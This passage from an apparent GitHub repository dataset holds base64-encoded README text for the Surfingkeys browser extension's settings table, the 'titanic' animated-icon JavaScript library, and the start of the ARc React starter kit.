Q2FuZGlkYXRlIHwgZmFsc2UgfCBXaGV0aGVyIHRvIGZvY3VzIGZpcnN0IGNh
bmRpZGF0ZSBvZiBtYXRjaGVkIHJlc3VsdCBpbiBPbW5pYmFyLiB8Cnwgc2V0
dGluZ3MudGFic1RocmVzaG9sZCB8IDkgfCBXaGVuIHRvdGFsIG9mIG9wZW5l
ZCB0YWJzIGV4Y2VlZHMgdGhlIG51bWJlciwgT21uaWJhciB3aWxsIGJlIHVz
ZWQgZm9yIGNob29zaW5nIHRhYnMuIHwKfCBzZXR0aW5ncy5oaW50c1RocmVz
aG9sZCB8IDEwMDAwIHwgV2hlbiB0b3RhbCBvZiByZWd1bGFyIGNsaWNrYWJs
ZSBlbGVtZW50cyAoYSwgYnV0dG9uLCBzZWxlY3QsIGlucHV0LCB0ZXh0YXJl
YSkgZXhjZWVkcyB0aGlzIG51bWJlciwgU3VyZmluZ2tleXMgd2lsbCBub3Qg
c2hvdyBoaW50cyBmb3Igb3RoZXIgZWxlbWVudHMgdGhhdCBhcmUgY2xpY2th
YmxlLiB8Cnwgc2V0dGluZ3MuY2xpY2thYmxlU2VsZWN0b3IgfCAiIiB8IEV4
dHJhIENTUyBzZWxlY3RvciB0byBwaWNrIGVsZW1lbnRzIGZvciBoaW50cyBt
b2RlLCBzdWNoIGFzICJcKi5qZmstYnV0dG9uLCBcKi5nb29nLWZsYXQtbWVu
dS1idXR0b24iLiB8Cnwgc2V0dGluZ3MuY2xpY2thYmxlUGF0IHwgLyhodHRw
cz8mIzEyNDt0aHVuZGVyJiMxMjQ7bWFnbmV0KTpcL1wvXFMrL2lnIHwgQSBy
ZWdleCB0byBkZXRlY3QgY2xpY2thYmxlIGxpbmtzIGZyb20gdGV4dCwgeW91
IGNvdWxkIHVzZSBgT2AgdG8gb3BlbiB0aGVtLiB8Cnwgc2V0dGluZ3Muc21v
b3RoU2Nyb2xsIHwgdHJ1ZSB8IFdoZXRoZXIgdG8gdXNlIHNtb290aCBzY3Jv
bGxpbmcgd2hlbiBwcmVzc2luZyBrZXlzIGxpa2UgYGpgL2BrYC9gZWAvYGRg
IHRvIHNjcm9sbCBwYWdlIG9yIGVsZW1lbnRzLiB8Cnwgc2V0dGluZ3MubW9k
ZUFmdGVyWWFuayB8ICIiIHwgV2hpY2ggbW9kZSB0byBmYWxsIGJhY2sgYWZ0
ZXIgeWFua2luZyB0ZXh0IGluIHZpc3VhbCBtb2RlLiBWYWx1ZSBjb3VsZCBi
ZSBvbmUgb2YgWyIiLCAiQ2FyZXQiLCAiTm9ybWFsIl0sIGRlZmF1bHQgaXMg
IiIsIHdoaWNoIG1lYW5zIG5vIGFjdGlvbiBhZnRlciB5YW5rLnwKfCBzZXR0
aW5ncy5zY3JvbGxTdGVwU2l6ZSB8IDcwIHwgQSBzdGVwIHNpemUgZm9yIGVh
Y2ggbW92ZSBieSBgamAvYGtgIHwKfCBzZXR0aW5ncy5zY3JvbGxGcmljdGlv
biB8IDAgfCBBIGZvcmNlIHRoYXQgaXMgbmVlZGVkIHRvIHN0YXJ0IGNvbnRp
bnVvdXMgc2Nyb2xsaW5nIGFmdGVyIGluaXRpYWwgc2Nyb2xsIHN0ZXAuIEEg
YmlnZ2VyIG51bWJlciB3aWxsIGNhdXNlIGEgZmxpY2tlciBhZnRlciBpbml0
aWFsIHN0ZXAsIGJ1dCBoZWxwIHRvIGtlZXAgdGhlIGZpcnN0IHN0ZXAgcHJl
Y2lzZS4gfAp8IHNldHRpbmdzLm5leHRMaW5rUmVnZXggfCAvKCg+PiYjMTI0
O25leHQpKykvaSB8IEEgcmVnZXggdG8gbWF0Y2ggbGlua3MgdGhhdCBpbmRp
Y2F0ZSBuZXh0IHBhZ2UuIHwKfCBzZXR0aW5ncy5wcmV2TGlua1JlZ2V4IHwg
LygoPDwmIzEyNDtwcmV2KGlvdXMpPykrKS9pfCBBIHJlZ2V4IHRvIG1hdGNo
IGxpbmtzIHRoYXQgaW5kaWNhdGUgcHJldmlvdXMgcGFnZS4gfAp8IHNldHRp
bmdzLmhpbnRBbGlnbiB8ICJjZW50ZXIiIHwgQWxpZ25tZW50IG9mIGhpbnRz
IG9uIHRoZWlyIHRhcmdldCBlbGVtZW50cy4gWyJsZWZ0IiwgImNlbnRlciIs
ICJyaWdodCJdIHwKfCBzZXR0aW5ncy5kZWZhdWx0U2VhcmNoRW5naW5lIHwg
ImciIHwgVGhlIGRlZmF1bHQgc2VhcmNoIGVuZ2luZSB1c2VkIGluIE9tbmli
YXIuIHwKfCBzZXR0aW5ncy5ibGFja2xpc3RQYXR0ZXJuIHwgdW5kZWZpbmVk
IHwgQSByZWdleCB0byBtYXRjaCB0aGUgc2l0ZXMgdGhhdCB3aWxsIGhhdmUg
U3VyZmluZ2tleXMgZGlzYWJsZWQuIHwKfCBzZXR0aW5ncy5mb2N1c0FmdGVy
Q2xvc2VkIHwgInJpZ2h0IiB8IFdoaWNoIHNpZGUgb2YgdGFiIHdpbGwgYmUg
Zm9jdXNlZCBhZnRlciBjdXJyZW50IHRhYiBjbG9zZWQuIFsibGVmdCIsICJy
aWdodCJdIHwKfCBzZXR0aW5ncy5yZXBlYXRUaHJlc2hvbGQgfCA5OSB8IFRo
ZSBtYXhpbXVtIG9mIGFjdGlvbnMgdG8gYmUgcmVwZWF0ZWQuIHwKfCBzZXR0
aW5ncy50YWJzTVJVT3JkZXIgfCB0cnVlIHwgV2hldGhlciB0byBsaXN0IG9w
ZW5lZCB0YWJzIGluIG9yZGVyIG9mIG1vc3QgcmVjZW50bHkgdXNlZCBiZW5l
YXRoIE9tbmliYXIuIHwKfCBzZXR0aW5ncy5oaXN0b3J5TVVPcmRlciB8IHRy
dWUgfCBXaGV0aGVyIHRvIGxpc3QgaGlzdG9yeSBpbiBvcmRlciBvZiBtb3N0
IHVzZWQgYmVuZWF0aCBPbW5pYmFyLiB8Cnwgc2V0dGluZ3MubmV3VGFiUG9z
aXRpb24gfCAnZGVmYXVsdCcgfCBXaGVyZSB0byBuZXcgdGFiLiBbImxlZnQi
LCAicmlnaHQiLCAiZmlyc3QiLCAibGFzdCIsICJkZWZhdWx0Il0gfAp8IHNl
dHRpbmdzLmludGVyY2VwdGVkRXJyb3JzIHwgW10gfCBJbmRpY2F0ZXMgZm9y
IHdoaWNoIGVycm9ycyBTdXJmaW5na2V5cyB3aWxsIHNob3cgZXJyb3IgcGFn
ZSwgc28gdGhhdCB5b3UgY291bGQgdXNlIFN1cmZpbmdrZXlzIG9uIHRob3Nl
IGVycm9yIHBhZ2VzLiBGb3IgZXhhbXBsZSwgWyIqIl0gdG8gc2hvdyBlcnJv
ciBwYWdlIGZvciBhbGwgZXJyb3JzLCBvciBbIm5ldDo6RVJSX05BTUVfTk9U
X1JFU09MVkVEIl0gdG8gc2hvdyBlcnJvciBwYWdlIG9ubHkgZm9yIEVSUl9O
QU1FX05PVF9SRVNPTFZFRCwgcGxlYXNlIHJlZmVyIHRvIFtuZXRfZXJyb3Jf
bGlzdC5oXShodHRwczovL2dpdGh1Yi5jb20vYWRvYmUvY2hyb21pdW0vYmxv
Yi9tYXN0ZXIvbmV0L2Jhc2UvbmV0X2Vycm9yX2xpc3QuaCkgZm9yIGNvbXBs
ZXRlIGVycm9yIGxpc3QuICB8Cnwgc2V0dGluZ3Muc3RhcnRUb1Nob3dFbW9q
aSB8IDIgfCBIb3cgbWFueSBjaGFyYWN0ZXJzIGFyZSBuZWVkZWQgYWZ0ZXIg
Y29sb24gdG8gc2hvdyBlbW9qaSBzdWdnZXN0aW9uLiB8Cnwgc2V0dGluZ3Mu
bGFuZ3VhZ2UgfCB1bmRlZmluZWQgfCBUaGUgbGFuZ3VhZ2Ugb2YgdGhlIHVz
YWdlIHBvcG92ZXIsIG9ubHkgInpoLUNOIiBpcyBhZGRlZCBmb3Igbm93LCBQ
UiBmb3IgYW55IG90aGVyIGxhbmd1YWdlIGlzIHdlbGNvbWVkLCBwbGVhc2Ug
c2VlIFtsMTBuLmpzb25dKGh0dHBzOi8vZ2l0aHViLmNvbS9icm9va2hvbmcv
U3VyZmluZ2tleXMvYmxvYi9tYXN0ZXIvcGFnZXMvbDEwOC5qc29uKS4gfAp8
IHNldHRpbmdzLnN0ZWFsRm9jdXNPbkxvYWQgfCB0cnVlIHwgV2hldGhlciB0
byBwcmV2ZW50IGZvY3VzIG9uIGlucHV0IG9uIHBhZ2UgbG9hZGVkLCBzZXQg
dG8gdHJ1ZSBieSBkZWZhdWx0IHNvIHRoYXQgd2UgY291bGQgdXNlIFN1cmZp
bmdrZXlzIGRpcmVjdGx5IGFmdGVyIHBhZ2UgbG9hZGVkLCBvdGhlcndpc2Ug
d2UgbmVlZCBwcmVzcyBgRXNjYCB0byBxdWl0IGlucHV0LiB8Cnwgc2V0dGlu
Z3MuZW5hYmxlQXV0b0ZvY3VzIHwgdHJ1ZSB8IFdoZXRoZXIgdG8gZW5hYmxl
IGF1dG8gZm9jdXMgYWZ0ZXIgbW91c2UgY2xpY2sgb24gc29tZSB3aWRnZXQu
IFRoaXMgaXMgZGlmZmVyZW50IHdpdGggYHN0ZWFsRm9jdXNPbkxvYWRgLCB3
aGljaCBpcyBvbmx5IGZvciB0aGUgdGltZSBvZiBwYWdlIGxvYWRlZC4gRm9y
IGV4YW1wbGUsIHRoZXJlIGlzIGEgaGlkZGVuIGlucHV0IGJveCBvbiBhIHBh
Z2UsIGl0IGlzIHR1cm5lZCB0byB2aXNpYmxlIGFmdGVyIHVzZXIgY2xpY2tz
IG9uIHNvbWUgb3RoZXIgbGluay4gSWYgeW91IGRvbid0IGxpa2UgdGhlIGlu
cHV0IHRvIGJlIGZvY3VzZWQgd2hlbiBpdCdzIHR1cm5lZCB0byB2aXNpYmxl
LCB5b3UgY291bGQgc2V0IHRoaXMgdG8gZmFsc2UuIHwKfCBzZXR0aW5ncy50
aGVtZSB8IHVuZGVmaW5lZCB8IFRvIGNoYW5nZSBjc3Mgb2YgdGhlIFN1cmZp
bmdrZXlzIFVJIGVsZW1lbnRzLiB8Cnwgc2V0dGluZ3MuY2FzZVNlbnNpdGl2
ZSB8IGZhbHNlIHwgV2hldGhlciBmaW5kaW5nIGluIHBhZ2UvT21uaWJhciBp
cyBjYXNlIHNlbnNpdGl2ZS4gfAp8IHNldHRpbmdzLnNtYXJ0Q2FzZSB8IHRy
dWUgfCBXaGV0aGVyIHRvIG1ha2UgY2FzZVNlbnNpdGl2ZSB0cnVlIGlmIHRo
ZSBzZWFyY2ggcGF0dGVybiBjb250YWlucyB1cHBlciBjYXNlIGNoYXJhY3Rl
cnMuIHwKfCBzZXR0aW5ncy5jdXJzb3JBdEVuZE9mSW5wdXQgfCB0cnVlIHwg
V2hldGhlciB0byBwdXQgY3Vyc29yIGF0IGVuZCBvZiBpbnB1dCB3aGVuIGVu
dGVyaW5nIGFuIGlucHV0IGJveCwgYnkgZmFsc2UgdG8gcHV0IHRoZSBjdXJz
b3Igd2hlcmUgaXQgd2FzIHdoZW4gZm9jdXMgd2FzIHJlbW92ZWQgZnJvbSB0
aGUgaW5wdXQuIHwKfCBzZXR0aW5ncy5kaWdpdEZvclJlcGVhdCB8IHRydWUg
fCBXaGV0aGVyIGRpZ2l0cyBhcmUgcmVzZXJ2ZWQgZm9yIHJlcGVhdHMsIGJ5
IGZhbHNlIHRvIGVuYWJsZSBtYXBwaW5nIG9mIG51bWVyaWMga2V5cy4gfAp8
IHNldHRpbmdzLmVkaXRhYmxlQm9keUNhcmUgfCB0cnVlIHwgSW5zZXJ0IG1v
ZGUgaXMgYWN0aXZhdGVkIGF1dG9tYXRpY2FsbHkgd2hlbiBhbiBlZGl0YWJs
ZSBlbGVtZW50IGlzIGZvY3VzZWQsIHNvIGlmIGRvY3VtZW50LmJvZHkgaXMg
ZWRpdGFibGUgZm9yIHNvbWUgd2luZG93L2lmcmFtZSAoc3VjaCBhcyBkb2Nz
Lmdvb2dsZS5jb20pLCBJbnNlcnQgbW9kZSBpcyBhbHdheXMgYWN0aXZhdGVk
IG9uIHRoZSB3aW5kb3cvaWZyYW1lLCB3aGljaCBtZWFucyBhbGwgc2hvcnRj
dXRzIGZyb20gTm9ybWFsIG1vZGUgd2lsbCBub3QgYmUgYXZhaWxhYmxlLiBX
aXRoIGBlZGl0YWJsZUJvZHlDYXJlYCBhcyBgdHJ1ZWAsIEluc2VydCBtb2Rl
IHdpbGwgbm90IGJlIGFjdGl2YXRlZCBhdXRvbWF0aWNhbGx5IGluIHRoaXMg
Y2FzZS4gfAp8IHNldHRpbmdzLmlnbm9yZWRGcmFtZUhvc3RzIHwgWyJodHRw
czovL3RwYy5nb29nbGVzeW5kaWNhdGlvbi5jb20iXSB8IFdoZW4gdXNpbmcg
YHdgIHRvIGxvb3AgdGhyb3VnaCBmcmFtZXMsIHlvdSBjb3VsZCB1c2UgdGhp
cyBzZXR0aW5ncyB0byBleGNsdWRlIHNvbWUgb2YgdGhlbSwgc3VjaCBhcyB0
aG9zZSBmb3IgYWR2ZXJ0aXNlbWVudHMuIHwKfCBzZXR0aW5ncy5hY2VLZXli
aW5kaW5ncyB8ICJ2aW0iIHwgU2V0IGl0ICJlbWFjcyIgdG8gdXNlIGVtYWNz
IGtleWJpbmRpbmdzIGluIHRoZSBBQ0UgZWRpdG9yLiB8Cnwgc2V0dGluZ3Mu
Y2FyZXRWaWV3cG9ydCB8IG51bGwgfCBTZXQgaXQgaW4gZm9ybWF0IGBbdG9w
LCBsZWZ0LCBib3R0b20sIHJpZ2h0XWAgdG8gbGltaXQgaGludHMgZ2VuZXJh
dGlvbiBvbiBgdmAgZm9yIGVudGVyaW5nIHZpc3VhbCBtb2RlLCBzdWNoIGFz
IGBbd2luZG93LmlubmVySGVpZ2h0IC8gMiAtIDEwLCAwLCB3aW5kb3cuaW5u
ZXJIZWlnaHQgLyAyICsgMTAsIHdpbmRvdy5pbm5lcldpZHRoXWAgd2lsbCBt
YWtlIFN1cmZpbmdrZXlzIGdlbmVyYXRlIEhpbnRzIG9ubHkgZm9yIHRleHQg
dGhhdCBkaXNwbGF5IG9uIHZlcnRpY2FsbHkgbWlkZGxlIG9mIHdpbmRvdy4g
fAp8IHNldHRpbmdzLm1vdXNlU2VsZWN0VG9RdWVyeSB8IFtdIHwgQWxsIGhv
c3RzIHRoYXQgaGF2ZSBlbmFibGUgZmVhdHVyZSAtLSBtb3VzZSBzZWxlY3Rp
b24gdG8gcXVlcnkuIHwKCiMjIyBFeGFtcGxlIG9mIHNldHRpbmdzLnRoZW1l
LCBiZWxvdyBpcyB0byBzZXQgZm9udCBzaXplIG9mIHN0YXR1cyBiYXIKCiAg
ICBzZXR0aW5ncy50aGVtZSA9IGAKICAgICAgICAjc2tfc3RhdHVzLCAjc2tf
ZmluZCB7CiAgICAgICAgICAgIGZvbnQtc2l6ZTogMjBwdDsKICAgICAgICB9
CiAgICB9YDsKCiMjIEFQSSBEb2N1bWVudGF0aW9uCgo+IFRoZSBBUEkgZG9j
dW1lbnRhdGlvbiBpcyBjdXJyZW50bHkgYSB3b3JrIGluIHByb2dyZXNzLgoK
KiBbTWFya2Rvd25dKGRvY3MvQVBJLm1kKQoqIFtIVE1MXShodHRwOi8vYnJv
b2tob25nLmdpdGh1Yi5pby9TdXJmaW5na2V5cykKCiMjIE90aGVyCgoqIFtB
bmtpIFN0dWR5IERlY2tdKGh0dHBzOi8vYW5raXdlYi5uZXQvc2hhcmVkL2lu
Zm8vMTE5NTE3Mzc2OCksIEFua2kgU3R1ZHkgRGVjayAoaGVscGZ1bCBmb3Ig
bWVtb3JpemluZyBrZXlib2FyZCBtYXBwaW5ncykgCgojIyBDcmVkaXRzCgoq
IH5+W2pRdWVyeV0oaHR0cHM6Ly9naXRodWIuY29tL2pxdWVyeS9qcXVlcnkp
fn4sIHJlbW92ZWQgZm9yIGxlc3MgbWVtb3J5IHVzYWdlIGFuZCBiZXR0ZXIg
cGVyZm9ybWFuY2UuCiogfn5bVFJJRV0oaHR0cHM6Ly9naXRodWIuY29tL21p
a2VkZWJvZXIvdHJpZSl+fiwgZmluYWxseSByZXBsYWNlZCBieSBteSBvd24g
c2ltcGxlIGltcGxlbWVudGF0aW9uIGZvciBsZXNzIG1lbW9yeSB1c2FnZSBh
bmQgYmV0dGVyIHBlcmZvcm1hbmNlLgoqIFtBQ0UgdmltIGVkaXRvcl0oaHR0
cHM6Ly9naXRodWIuY29tL2FqYXhvcmcvYWNlKSwgZm9yIHZpbSBlZGl0b3Iu
CiogW21hcmtkb3duIHBhcnNlcl0oaHR0cHM6Ly9naXRodWIuY29tL2Noamov
bWFya2VkKSwgZm9yIG1hcmtkb3duIHBhcnNlci4KKiBbcGRmLmpzXShodHRw
czovL2dpdGh1Yi5jb20vbW96aWxsYS9wZGYuanMpLCBmb3IgcGRmIHZpZXdl
ci4KKiBbdmltaXVtXShodHRwczovL2dpdGh1Yi5jb20vcGhpbGMvdmltaXVt
KSwgZm9yIHRoZSBkYXlzIHdpdGhvdXQgdGhpcyBleHRlbnNpb24uCiogW2NW
aW1dKGh0dHBzOi8vZ2l0aHViLmNvbS8xOTk1ZWF0b24vY2hyb21pdW0tdmlt
KSwgZm9yIHRoZSBkYXlzIHdpdGhvdXQgdGhpcyBleHRlbnNpb24uCgojIyBM
aWNlbnNlCgpNSVQgTGljZW5zZQo=
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'titanic',85344516,b'A set of animated icons + code to insert them into the webpages',b'JavaScript',10,2395,,2395,False,b'https://api.github.com/repos/icons8/titanic/forks',"IyBUaXRhbmljCgpBIGNvbGxlY3Rpb24gb2YgYW5pbWF0ZWQgaWNvbnMgKyBq
YXZhc2NyaXB0IGxpYnJhcnkuCgohW1ByZXZpZXddKC9kb2NzL2ltYWdlcy9h
bmltYXRlZC1pY29ucy1wcmV2aWV3LmdpZikKCioqW1ByZXZpZXcgYWxsIGlj
b25zXShodHRwczovL3Jhd2dpdC5jb20vaWNvbnM4L3RpdGFuaWMvbWFzdGVy
L2RlbW8vaW5kZXguaHRtbCkqKgoKIyMgSW5zdGFsbGF0aW9uCgpZb3UgY2Fu
IGluc3RhbGwgaXQgZWl0aGVyIHZpYSBDRE4gb3IgbnBtLgoKIyMjIENETgoK
SW5zZXJ0IHRoaXMgc3RyaW5nIHRvIHlvdXIgSFRNTCBoZWFkOgpgYGBodG1s
CjxzY3JpcHQgc3JjPSJodHRwczovL2Nkbi5yYXdnaXQuY29tL2ljb25zOC90
aXRhbmljL21hc3Rlci9kaXN0L2pzL3RpdGFuaWMubWluLmpzIj48L3Njcmlw
dD4KPHNjcmlwdCBzcmM9Imh0dHBzOi8vY2RuanMuY2xvdWRmbGFyZS5jb20v
YWpheC9saWJzL2JvZHltb3Zpbi80LjUuOS9ib2R5bW92aW4ubWluLmpzIj48
L3NjcmlwdD4KYGBgCkFuZCBpbml0aWFsaXplIGl0IGJlZm9yZSB0aGUgYm9k
eSBjbG9zZXM6CgpgYGBodG1sCjxzY3JpcHQ+CiAgICB2YXIgdGl0YW5pYyA9
IG5ldyBUaXRhbmljKCk7Cjwvc2NyaXB0PgpgYGAKVGhpcyB3YXksIHlvdSBj
YW4gYWRkIGljb25zIGFueXdoZXJlIGluIHlvdXIgSFRNTCB1c2luZyB0aGlz
IHRhZzoKYGBgaHRtbAo8ZGl2IGNsYXNzPSd0aXRhbmljIHRpdGFuaWMtY2hh
dCc+PC9kaXY+CmBgYApXaGVyZSBjaGF0IGNhbiBiZSBhbnkgb2YgdGhlc2U6
CiogY2FwcwoqIGNoYXQKKiBjaGVja2JveAoqIGV4cGFuZAoqIGNoZWFwCiog
ZXhwZW5zaXZlCiogaWRlYQoqIG1haWxib3gKKiBtaWMKKiBuby1taWMKKiBv
bmxpbmUKKiBwYXVzZQoqIHBvd2VyCiogc2hvcHBpbmcKKiBzbWlsZQoqIHN0
b3AKKiB1bmxvY2sKKiB6b29tCgojIyMgSG9zdGluZyB5b3VyIGltYWdlcwoK
SWYgeW91J2QgbGlrZSB0byBob3N0IHlvdXIgaW1hZ2VzIG9uIHlvdXIgc2Vy
dmVyIGluc3RlYWQgb2YgcmF3Z2l0LCBwYXNzIHRoZSBiYXNlIFVSTCB3aXRo
IHRoZSBpbml0KCkgZnVuY3Rpb246CmBgYGphdmFzY3JpcHQKdGl0YW5pYy5i
ZWdpbignL215L2Jhc2UvZGlyZWN0b3J5LycpOwpgYGAKVGhlbiwgaWYgeW91
IGhhdmUgYSBkaXYgd2l0aCBpZD0iY2hhdCIsIFRpdGFuaWMgd2lsbCBzZWFy
Y2ggZm9yIGljb25zIGluIC9teS9iYXNlL2RpcmVjdG9yeS9jaGF0Lmpzb24u
CgojIyBucG0KCmBgYApucG0gaW5zdGFsbCB0aXRhbmljLWljb25zIC0tc2F2
ZQpgYGAKCiMjIEFQSQoKKiBgYGB0aXRhbmljLmlzSW5pdGlhbGl6ZWQoKWBg
YCAtLSBqdXN0IHRydWUvZmFsc2UgZmxhZwoKKiBgYGB0aXRhbmljLml0ZW1z
YGBgIC0tIGxpc3Qgb2YgdGl0YW5pYyBpdGVtcwoqIGBgYHRpdGFuaWMuaXRl
bXNbaW5kZXhdLm9uKCksIHRpdGFuaWMuaXRlbXNbaW5kZXhdLm9mZigpLCB0
aXRhbmljLml0ZW1zW2luZGV4XS5wbGF5KClgYGAgLS0gcGxheSBhbmltYXRp
b25zIG9mIHRoZSB0aXRhbmljIGl0ZW0gYnkgaW5kZXgKKiBgYGB0aXRhbmlj
Lm9uKHRva2VuKSwgdGl0YW5pYy5vZmYodG9rZW4pLCB0aXRhbmljLnBsYXko
dG9rZW4pYGBgIC0tIHBsYXkgYW5pbWF0aW9ucyBvZiB0aGUgdGl0YW5pYyBp
dGVtIGJ5IHRva2VuIChuYW1lKQoKIyMgRXhhbXBsZQoKYGBgaHRtbAo8aGVh
ZD4KICAgIDwhLS1JbnNlcnRpbmcgdGhlIHNjcmlwdHMgb25jZSBmb3IgdGhl
IHdob2xlIHBhZ2UtLT4KICAgIDxzY3JpcHQgc3JjPSJodHRwczovL2Nkbi5y
YXdnaXQuY29tL2ljb25zOC90aXRhbmljL21hc3Rlci9kaXN0L2pzL3RpdGFu
aWMubWluLmpzIj48L3NjcmlwdD4KICAgIDxzY3JpcHQgc3JjPSJodHRwczov
L2NkbmpzLmNsb3VkZmxhcmUuY29tL2FqYXgvbGlicy9ib2R5bW92aW4vNC41
LjkvYm9keW1vdmluLm1pbi5qcyI+PC9zY3JpcHQ+CjwvaGVhZD4KPGJvZHk+
CiAgICA8IS0tSW5zZXJ0aW5nIGFuIGljb24tLT4KICAgIDxkaXYgY2xhc3M9
J3RpdGFuaWMgdGl0YW5pYy1jaGVja2JveCc+PC9kaXY+CgogICAgPCEtLUlu
aXRpYWxpemluZy0tPgogICAgPHNjcmlwdD4KICAgICAgICB2YXIgdGl0YW5p
YyA9IG5ldyBUaXRhbmljKHsKICAgICAgICAgIGhvdmVyOiB0cnVlLCAvLyBh
dXRvIGFuaW1hdGVkIG9uIGhvdmVyIChkZWZhdWx0IHRydWUpCiAgICAgICAg
ICBjbGljazogdHJ1ZSAgLy8gYXV0byBhbmltYXRlZCBvbiBjbGljay90YXAg
KGRlZmF1bHQgZmFsc2UpCiAgICAgICAgfSk7CiAgICA8L3NjcmlwdD4KCiAg
ICA8IS0tQ2xpY2tpbmcgdHVybnMgdGhpcyBpY29uIG9uLS0+CiAgICA8YnV0
dG9uIG9uY2xpY2s9InRpdGFuaWMub24oZ2V0RWxlbWVudEJ5SWQoJ2NoZWNr
Ym94JykudmFsdWUpIj5PbjwvYnV0dG9uPgo8L2JvZHk+CmBgYAoKIyMgQ3Jl
ZGl0cwpKYXZhU2NyaXB0IGlzIGJhc2ljYWxseSBbYm9keW1vdmluXShodHRw
czovL2dpdGh1Yi5jb20vYm9keW1vdmluL2JvZHltb3ZpbikgcGx1cyBmZXcg
bGluZXMgb2YgbXkgY29kZS4gSXQncyBhIHNvbGlkIGxpYnJhcnkgd2l0aCBh
biBhd2Vzb21lIG5hbWUuIFRoYW5rIHlvdSwgZ3V5cy4KCkljb25zIGFyZSBj
cmVhdGVkIGJ5IFtNYXJnYXJpdGEgSXZhbmNoaWtvdmFdKGh0dHBzOi8vZHJp
YmJibGUuY29tL2ltYXJnYXJpdGEpIGZyb20gW0ljb25zOF0oaHR0cHM6Ly9p
Y29uczguY29tLykuIFNoZSBoYXMgbWFueSBtb3JlIGF3ZXNvbWUgYW5pbWF0
aW9ucyBpbiBoZXIgcG9ydGZvbGlvLgoKVGhlIGNvZGUgcmV3cml0dGVuIGJ5
IFtEZW5pcyBBbGV4YW5vdl0oaHR0cHM6Ly9naXRodWIuY29tL2RoaWx0KSwg
bXkgdGVhY2hlciBhbmQgZ3VydS4gVGhhbmsgeW91IQoKUHJvamVjdCBpcyBw
cm9kdWNlZCBieSBJY29uczgsIGF1dGhvciBvZiB0aGUgZmFtb3VzIGljb24g
bGlicmFyeSwgW0ljb25QaGFybV0oaHR0cHM6Ly9pY29ucGhhcm0uY29tKSwg
YW5kIFtTbGVlayBMb2dvc10oaHR0cHM6Ly9zbGVla2xvZ29zLmRlc2lnbiku
CgpUaGUgY29kZSBpcyBjcmVhdGVkIGJ5IEljb25zOCAKCiFbTWFncml0dGVd
KC9kb2NzL2ltYWdlcy9tYWdyaXR0ZS5naWYpCg==
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'arc',70382340,b'React starter kit based on Atomic Design',b'JavaScript',37,2395,,2395,False,b'https://api.github.com/repos/diegohaz/arc/forks',"PHAgYWxpZ249ImNlbnRlciI+CiAgPGltZyBhbHQ9ImFyY2xvZ28iIHNyYz0i
aHR0cHM6Ly9jbG91ZC5naXRodWJ1c2VyY29udGVudC5jb20vYXNzZXRzLzMw
Njg1NjMvMjMxOTkwMjkvNTVlOWQ1NWEtZjhhYS0xMWU2LTkxYTItNzRiODJk
YjM4MTNjLnBuZyI+PGJyPjxicj4KICA8YSBocmVmPSJodHRwczovL3RyYXZp
cy1jaS5vcmcvZGllZ29oYXovYXJjIj48aW1nIHNyYz0iaHR0cHM6Ly9pbWcu
c2hpZWxkcy5pby90cmF2aXMvZGllZ29oYXovYXJjL21hc3Rlci5zdmc/c3R5
bGU9ZmxhdC1zcXVhcmUiIGFsdD0iQnVpbGQgU3RhdHVzIiAvPjwvYT4KICA8
YSBocmVmPSJodHRwczovL2NvZGVjb3YuaW8vZ2gvZGllZ29oYXovYXJjIj48
aW1nIHNyYz0iaHR0cHM6Ly9pbWcuc2hpZWxkcy5pby9jb2RlY292L2MvZ2l0
aHViL2RpZWdvaGF6L2FyYy5zdmc/c3R5bGU9ZmxhdC1zcXVhcmUiIGFsdD0i
Q292ZXJhZ2UgU3RhdHVzIiAvPjwvYT4KICA8YSBocmVmPSJodHRwczovL2dp
dHRlci5pbS9kaWVnb2hhei9hcmMiPjxpbWcgc3JjPSJodHRwczovL2ltZy5z
aGllbGRzLmlvL2JhZGdlL2NoYXQtb24lMjBnaXR0ZXItMWRjZTczLnN2Zz9z
dHlsZT1mbGF0LXNxdWFyZSIgYWx0PSJHaXR0ZXIgY2hhdCIgLz48L2E+Cjwv
cD4KCioqQVJjKiogKEF0b21pYyBSZWFjdCkgaXMgYSBSZWFjdCBzdGFydGVy
IGtpdCBiYXNlZCBvbiB0aGUgW0F0b21pYyBEZXNpZ25dKGh0dHA6Ly9icmFk
ZnJvc3QuY29tL2Jsb2cvcG9zdC9hdG9taWMtd2ViLWRlc2lnbi8pIG1ldGhv
ZG9sb2d5LiBJdCdzIHByb2dyZXNzaXZlLCB3aGljaCBtZWFucyB0aGF0IHlv
dSBjYW4gc3RhcnQgd2l0aCB0aGUgYmFzaWMgYm9pbGVycGxhdGUgYW5kIHRy
eSB0aGUgb3RoZXIgZmVhdHVyZXMgd2hlbiB5b3UgYXJlIGNvbWZvcnRhYmxl
LgoKLSAqKltEZW1vXShodHRwczovL2FyYy5qcy5vcmcpKioKLSAqKltEb2N1
bWVudGF0aW9uXShodHRwczovL2dpdGh1Yi5jb20vZGllZ29oYXovYXJjL3dp
a2kpKioKCjxicj4KPGhyPgo8cCBhbGlnbj0iY2VudGVyIj4KSWYgeW91IGZp
bmQgdGhpcyB1c2VmdWwsIHBsZWFzZSBjaGVjayBvdXQgPGEgaHJlZj0iaHR0
cHM6Ly9naXRodWIuY29tL3JlYWtpdC9yZWFraXQiPjxzdHJvbmc+UmVha2l0
PC9zdHJvbmc+LCBhIHRvb2xraXQgZm9yIGJ1aWxkaW5nIGNvbXBvc2FibGUg
VUkgd2l0aCBSZWFjdDwvYT4uCjwvcD4KPGhyPgo8YnI+CgojIyBCcmFuY2hl
cwoKLSAjIyMgW2BtYXN0ZXJgXShodHRwczovL2dpdGh1Yi5jb20vZGllZ29o
YXovYXJjKQoKICBUaGUgYmFzaWMgc3RhY2sgd2l0aCBbUmVhY3RdKGh0dHBz
